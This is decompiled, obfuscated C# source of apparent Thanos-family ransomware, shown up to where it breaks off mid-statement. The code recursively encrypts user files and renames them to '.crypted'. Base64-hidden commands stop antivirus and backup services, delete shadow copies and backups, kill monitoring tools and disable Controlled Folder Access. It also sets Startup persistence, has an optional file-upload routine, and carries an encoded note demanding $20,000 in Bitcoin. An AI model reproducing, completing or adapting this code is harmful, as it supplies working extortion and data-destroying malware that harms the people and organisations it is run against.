using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using lowFQsJSlrFgr;

namespace MufMaOSvGyvz;

internal class IyUWqQZlcOSTLhq
{
	public class jtxivXeSYrLUbhy
	{
		private static StringCollection TBtLAydjtqh = new StringCollection();

		private static List<string> UGGVvOxBNDKjv = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(jKGdMalhZeKXBCvc("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("HOW_TO_DECYPHER_FILES") && !text.EndsWith(".crypted") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(KYDuKlMFWLOzqeDUz))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(HJhinhnlOMNxIX) * 1024.0 * 1024.0 && FFbMRUzulqEpb == "YES")
							{
								UGGVvOxBNDKjv.Add(text);
							}
							else if (File.Exists(text) && FFbMRUzulqEpb == "NO")
							{
								UGGVvOxBNDKjv.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return UGGVvOxBNDKjv;
		}
	}

	private sealed class qnaQFtvgrosG
	{
		public string[] qbsdORlwvxu;

		public void _003CMain_003Eb__5()
		{
			FAripJTXHNalmT.bTnVewWeool(qbsdORlwvxu);
		}
	}

	private sealed class ldXpuSFdlzXsf
	{
		public string[] wRpHEPAtkvsJOZo;

		public string[] vyUBfhhKAo;

		public string PrmBaLAeEGy;

		public string VWJpqjqHbP;
	}

	private sealed class uKOVEKzchnPsIO
	{
		public ldXpuSFdlzXsf rvBvEQIyVzuxrLj;

		public string KxwFjccKfD;

		public void _003CCrypt_003Eb__d()
		{
			FAKScXrbtoSt(KxwFjccKfD, rvBvEQIyVzuxrLj.wRpHEPAtkvsJOZo, rvBvEQIyVzuxrLj.VWJpqjqHbP, rvBvEQIyVzuxrLj.vyUBfhhKAo, rvBvEQIyVzuxrLj.PrmBaLAeEGy);
		}
	}

	private sealed class WbDnpXySnYPBD
	{
		public List<string> UIEWVHYeVoR;

		public List<string> fevfiSigOoErXD;

		public string RryKduFtzbfiPI;

		public string[] DhKhIlMiANCZ;

		public string KRFQhWmJuhVexr;

		public void _003CWorkerCrypter2_003Eb__15(string string_0)
		{
			foreach (string item in fevfiSigOoErXD)
			{
				if (DhKhIlMiANCZ.Length != 0)
				{
					string[] dhKhIlMiANCZ = DhKhIlMiANCZ;
					int num = 0;
					while (num < dhKhIlMiANCZ.Length)
					{
						string value = dhKhIlMiANCZ[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f0;
					}
				}
				if ((oCUqHyphdF == "NO" && !item.EndsWith(string_0)) || CfvwdOobMuXeStMb.Contains(item))
				{
					continue;
				}
				if (zKSeEXflLrlh == "YES")
				{
					try
					{
						if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(item))
						{
							MZxLtJzLRoIRU.RZJqgaZnLiq(item);
						}
					}
					catch
					{
					}
				}
				CfvwdOobMuXeStMb.Add(item);
				if (!CSiGcEXgTf.Contains(Path.GetDirectoryName(item)))
				{
					CSiGcEXgTf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (fCiJsjNmDGYo == "YES" && fileStream.Length > Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024 && !UIEWVHYeVoR.Contains(string_0))
					{
						if (uySjNlajuEE == "YES")
						{
							foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
							{
								if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
								{
									if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = yZSyNMrNhJ.GoOtXsDsUX(item, Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024);
						byte[] byte_2 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(byte_, Encoding.ASCII.GetBytes(KRFQhWmJuhVexr), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						yZSyNMrNhJ.vGnSKjsiWPsmf(item, byte_2);
						if (RryKduFtzbfiPI != ".*")
						{
							File.Move(item, item + RryKduFtzbfiPI);
						}
					}
					else if (RryKduFtzbfiPI != ".*")
					{
						KfLhmyplGPYqxR(item, item + RryKduFtzbfiPI, ctSkisxFbkPzS);
					}
					else
					{
						KfLhmyplGPYqxR(item, item + ".part", ctSkisxFbkPzS);
					}
				}
				catch (Exception)
				{
				}
				IL_02f0:;
			}
		}
	}

	private sealed class IzImQwKqnmdl
	{
		public string MQXFfvSrdXstlCz;

		public string GhQNYBCsZpGoSQ;

		public void _003CEncrypt2_003Eb__18()
		{
			while (true)
			{
				try
				{
					File.Delete(MQXFfvSrdXstlCz);
					break;
				}
				catch
				{
				}
			}
		}

		public void _003CEncrypt2_003Eb__19()
		{
			while (true)
			{
				try
				{
					if (File.Exists(GhQNYBCsZpGoSQ))
					{
						File.Delete(GhQNYBCsZpGoSQ);
					}
					break;
				}
				catch
				{
				}
			}
		}
	}

	public static string xQMkqhCYTvWMq = "EVET";

	public static byte[] ctSkisxFbkPzS = null;

	public static string FFbMRUzulqEpb = "NO";

	public static string HJhinhnlOMNxIX = "100000000";

	public static List<string> siKfLgBTOtPOl = new List<string>();

	public static List<string> hkQMoFyHzQ = new List<string>();

	public static string JNHKDqKmSycXVyA = "NO";

	public static string KRFQhWmJuhVexr = "";

	public static string SMVGmorJMiSRUva = "NO";

	public static int hXaNTqTbRnpr = 0;

	public static string zKSeEXflLrlh = "NO";

	public static string LDNdJBbfsdAY = "NO";

	public static string kqxgiwAmxJZAF = "NO";

	public static string efojwxvnMIbXXP = "0";

	public static string IUvwjPVcqFrE = "YES";

	public static string QDIBAwivbzugjctV = "NO";

	public static string PVCmRrdzBeoM = "NO";

	public static string IBSndtoMdgy = "NO";

	public static List<string> wiZlVeXAvqcJt = new List<string>
	{
		jKGdMalhZeKXBCvc("bHNhc3MuZXhl"),
		jKGdMalhZeKXBCvc("c3ZjaHN0LmV4ZQ=="),
		jKGdMalhZeKXBCvc("Y3Jjc3MuZXhl"),
		jKGdMalhZeKXBCvc("Y2hyb21lMzIuZXhl"),
		jKGdMalhZeKXBCvc("ZmlyZWZveC5leGU="),
		jKGdMalhZeKXBCvc("Y2FsYy5leGU="),
		jKGdMalhZeKXBCvc("bXlzcWxkLmV4ZQ=="),
		jKGdMalhZeKXBCvc("ZGxsaHN0LmV4ZQ=="),
		jKGdMalhZeKXBCvc("b3BlcmEzMi5leGU="),
		jKGdMalhZeKXBCvc("bWVtb3AuZXhl"),
		jKGdMalhZeKXBCvc("c3Bvb2xjdi5leGU="),
		jKGdMalhZeKXBCvc("Y3RmbW9tLmV4ZQ=="),
		jKGdMalhZeKXBCvc("U2t5cGVBcHAuZXhl")
	};

	public static List<string> CSiGcEXgTf = new List<string>();

	public static string ELyYGppfySYfq = "YES";

	public static string udJVdpbosFv = "NO";

	public static string nEFvYMIALr = "NO";

	public static List<string> CfvwdOobMuXeStMb = new List<string>();

	public static string YkwRnYlFytdkH = "NO";

	private static string YQBusMLxsiehe = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string FsmxXwwVyXze = "YES";

	public static string OZagXxYpUbG = "NO";

	public static List<string> ypieyuCOltLWYFl = new List<string>
	{
		jKGdMalhZeKXBCvc("c3RvcCBhdnBzdXMgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBtZmV3YyAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBEZWZXYXRjaCAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBjY0V2dE1nciAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBjY1NldE1nciAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBTYXZSb2FtIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBSVFZzY2FuIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBZb29CYWNrdXAgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBZb29JVCAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		jKGdMalhZeKXBCvc("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		jKGdMalhZeKXBCvc("c3RvcCBWU05BUFZTUyAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCB2ZWVhbSAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBBY3JTY2gyU3ZjIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		jKGdMalhZeKXBCvc("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		jKGdMalhZeKXBCvc("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		jKGdMalhZeKXBCvc("c3RvcCBzb3Bob3MgL3k=")
	};

	public static List<string> YDWHvbVPBJ = new List<string>
	{
		jKGdMalhZeKXBCvc("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		jKGdMalhZeKXBCvc("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		jKGdMalhZeKXBCvc("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		jKGdMalhZeKXBCvc("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> AgdpzRigFOYhsqvH = new List<string>
	{
		jKGdMalhZeKXBCvc("L0lNIG1zcHViLmV4ZSAvRg=="),
		jKGdMalhZeKXBCvc("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		jKGdMalhZeKXBCvc("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> WRakAWHNtJErZ = new List<string>
	{
		jKGdMalhZeKXBCvc("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		jKGdMalhZeKXBCvc("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		jKGdMalhZeKXBCvc("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> PMQqUDKVTQJ = new List<string>
	{
		jKGdMalhZeKXBCvc("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		jKGdMalhZeKXBCvc("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		jKGdMalhZeKXBCvc("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		jKGdMalhZeKXBCvc("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		jKGdMalhZeKXBCvc("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		jKGdMalhZeKXBCvc("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string lMBJRPlmLoPIJX = "NO";

	public static string zHSVICJAOa = "NO";

	internal static DateTime OOZMRHMVMrmD = new DateTime(2000, 1, 1);

	internal static DateTime LViAigNUQAbNhB = new DateTime(2100, 1, 1);

	public static string fCiJsjNmDGYo = "YES";

	public static string tsQtKfDKZIMNuO = "10";

	public static string VgdNVBEBhpUPO = "NO";

	public static string rwJLUnGaYuk = "NO";

	public static string JntTsbLDjfdWrF = "NO";

	public static string WgQvAOsxNeWD = "YES";

	public static string qqibCzLAGVg = "NO";

	public static string uySjNlajuEE = "NO";

	public static List<string> ulDHvcBRgNNLZtzS = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string BtOESQEmmPY = "NO";

	public static string uOyyfFtzedTPufn = "1";

	public static string mlQgpavlrIuX = "YES";

	public static string oiSsXsWUMOtEp = "NO";

	public static string KkZoOVzwQPf = "NO";

	public static string idAGkbKivQU = string.Empty;

	public static string gremWWHIcFVT = "NO";

	public static string ldDdAgsFLTkAX = "YES";

	public static string ZPHPKQDuPKi = "YES";

	public static string rqOtfqTYGrTie = "SW5mb3JtYXRpb24uLi4=";

	public static string wrCDlMOHoXr = "WW91ciBGaWxlcyBhcmUgRW5jcnlwdGVkLg0KDQpEb27igJl0IHdvcnJ5LCB5b3UgY2FuIHJldHVybiBhbGwgeW91ciBmaWxlcyENCg0KWW91J3ZlIGdvdCA0OCBob3VycygyIERheXMpLCBiZWZvcmUgeW91IGxvc3QgeW91ciBmaWxlcyBmb3JldmVyLg0KSSB3aWxsIHRyZWF0IHlvdSBnb29kIGlmIHlvdSB0cmVhdCBtZSBnb29kIHRvby4NCg0KVGhlIFByaWNlIHRvIGdldCBhbGwgdGhpbmdzIHRvIHRoZSBub3JtYWwgOiAyMCwwMDAkDQpNeSBCVEMgV2FsbGV0IElEIDoNCjFGNnNxOFl2ZnRUZnVFNFFjWXhmSzhzNVhGVVVIQzdzRDkNCg0KQ29udGFjdCA6DQpqb3NlcGhudWxsQHNlY21haWwucHJvDQo=";

	public static string rtiZKDwSQcOQoyu = "NO";

	public static string aWdGZORAeYAJ = "NO";

	public static string oCUqHyphdF = "NO";

	public static string VneWBiDudYbxfV = "NO";

	public static string nrUdlkCMdxZ = "YES";

	public static string oarFYicwLcOiB = "LOGONISOFF";

	public static string wEFLZtRchlX = "YES";

	public static string WnYspfSeqpPPh = "NO";

	public static string KYDuKlMFWLOzqeDUz = "mystartup.lnk";

	public static string XKCeykQXWEYgem = "NO";

	public static string OZfhJywPQSn = "NO";

	public static string JGjnyMyTennfuufcT = "YES";

	public static string ylIKJJsgdllsSVj = "YES";

	public static string LcFYzbWwUuFdZ = "VGhhbm9z";

	public static string gcOHYvBogGyw = "YES";

	public static string amSYDuIqjtb = "NO";

	private static void Main(string[] args)
	{
		try
		{
			MPimnsOrmpnAX.IjTKmPwIgCf(YQBusMLxsiehe);
		}
		catch (Exception)
		{
		}
		try
		{
			if (gcOHYvBogGyw == "YES")
			{
				Thread thread = new Thread(hpvgypLXixi.YfdgCPKijzed);
				thread.Priority = ThreadPriority.Lowest;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (kqxgiwAmxJZAF == "YES")
		{
			Thread.Sleep(int.Parse(efojwxvnMIbXXP));
		}
		try
		{
			if (wEFLZtRchlX == "YES")
			{
				string text = jMDFRLEyorejfI.vgwIjtaVyLLgbVk();
				if (!text.Contains("Windows 10") && !text.Contains("Windows 8"))
				{
					jMDFRLEyorejfI.CFPjirxGMKMKPt();
				}
			}
		}
		catch (Exception)
		{
		}
		if (mlQgpavlrIuX == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					qnaQFtvgrosG CS_0024_003C_003E8__locals0 = new qnaQFtvgrosG();
					CS_0024_003C_003E8__locals0.qbsdORlwvxu = new string[4]
					{
						jKGdMalhZeKXBCvc("VGFza21ncg=="),
						jKGdMalhZeKXBCvc("dGFza21ncg=="),
						jKGdMalhZeKXBCvc("UHJvY2Vzc0hhY2tlcg=="),
						jKGdMalhZeKXBCvc("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						FAripJTXHNalmT.bTnVewWeool(CS_0024_003C_003E8__locals0.qbsdORlwvxu);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm(jKGdMalhZeKXBCvc("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm(jKGdMalhZeKXBCvc("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm(jKGdMalhZeKXBCvc("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm(jKGdMalhZeKXBCvc("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(FAripJTXHNalmT.QvJxjZHBdlZUQ);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && qqibCzLAGVg == "YES")
		{
			try
			{
				TQpGafavBJI(jKGdMalhZeKXBCvc("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (IUvwjPVcqFrE == "YES")
		{
			QLRuRgFESyg.PXPqDNdvjDrC();
		}
		if (PVCmRrdzBeoM == "YES" && !xxKHdLdCMeOG.DfTRTAsuFViXE())
		{
			xxKHdLdCMeOG.bfVvoFmZrqIvYF();
		}
		if (udJVdpbosFv == "YES" && xxKHdLdCMeOG.DfTRTAsuFViXE())
		{
			new tOQtIRDNrGpD().ywIDKStthl(bool_0: false);
			new tOQtIRDNrGpD().jkSoOuByvlwrEF();
		}
		if (LDNdJBbfsdAY == "YES")
		{
			ghEykQIAJr.aiPqAgDxThSDE();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text3 = text2 + Path.GetFileName(fileName);
		if (SMVGmorJMiSRUva == "YES" && fileName != text3)
		{
			Thread thread4 = new Thread(zstTHeVErMkJUU);
			thread4.IsBackground = true;
			thread4.Priority = ThreadPriority.Highest;
			thread4.Start();
		}
		if (JNHKDqKmSycXVyA == "YES" && mainModule != null && fileName != text3)
		{
			try
			{
				hXaNTqTbRnpr = DPxcFgWfJlePTF(0, wiZlVeXAvqcJt.Count);
				File.Copy(fileName, text2 + wiZlVeXAvqcJt[hXaNTqTbRnpr], overwrite: true);
				Process.Start(text2 + wiZlVeXAvqcJt[hXaNTqTbRnpr]);
				obllpHNmyTXvR();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (lMBJRPlmLoPIJX == "YES" && DateTime.Now < OOZMRHMVMrmD)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (zHSVICJAOa == "YES" && DateTime.Now > LViAigNUQAbNhB)
			{
				obllpHNmyTXvR();
			}
		}
		catch
		{
		}
		foreach (string item in ypieyuCOltLWYFl)
		{
			tbluQOozLSqDhFc("net.exe", item);
		}
		foreach (string item2 in YDWHvbVPBJ)
		{
			tbluQOozLSqDhFc("sc.exe", item2);
		}
		foreach (string item3 in AgdpzRigFOYhsqvH)
		{
			tbluQOozLSqDhFc("taskkill.exe", item3);
		}
		foreach (string item4 in WRakAWHNtJErZ)
		{
			tbluQOozLSqDhFc(jKGdMalhZeKXBCvc("dnNzYWRtaW4uZXhl"), item4);
		}
		foreach (string item5 in PMQqUDKVTQJ)
		{
			tbluQOozLSqDhFc(jKGdMalhZeKXBCvc("ZGVsLmV4ZQ=="), item5);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			tbluQOozLSqDhFc("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (ELyYGppfySYfq == "YES" && LEYLEJpRfEgTMCc() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(IxJlmmAtIYbweZ.DtsYjXXFKl);
			thread5.IsBackground = true;
			thread5.Start();
		}
		if (!(OZagXxYpUbG == "YES"))
		{
		}
		if (VgdNVBEBhpUPO == "NO")
		{
			KRFQhWmJuhVexr = EOjDcEpeLmEa.BkigirNyAye(32);
		}
		else
		{
			KRFQhWmJuhVexr = "LD2WALLJZR93XK10KS892LMU006ZXO3Q";
		}
		string text4 = KcMVbmuWfLLu.QKUAgIgehqhgaII(KRFQhWmJuhVexr);
		if (ldDdAgsFLTkAX == "YES")
		{
			glLILXcrbW();
		}
		PDPmvqgvIguXKGS.BPwwjcgjbB(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), KYDuKlMFWLOzqeDUz), iSQQzPCCLFgv(text4), null, null, "Installer...", "Ctrl+Shift+X", null);
		try
		{
			QvJELJzMCQJDDH(new string[1] { "[auto]" }, new string[101]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z"
			}, new string[0], KRFQhWmJuhVexr, ".crypted");
		}
		catch
		{
		}
		KRFQhWmJuhVexr = EOjDcEpeLmEa.BkigirNyAye(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
			streamWriter.WriteLine(jKGdMalhZeKXBCvc("WW91ciBmaWxlcyB3ZXJlIHNhZmVseSBjeXBoZXJlZC4NCg0KQ29udGFjdDogbXktY29udGFjdC1lbWFpbEBwcm90b25tYWlsLmNvbQ=="));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(jKGdMalhZeKXBCvc("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(text4);
			if (FsmxXwwVyXze == "NO")
			{
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(jKGdMalhZeKXBCvc("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(CfvwdOobMuXeStMb.Count));
			}
		}
		else
		{
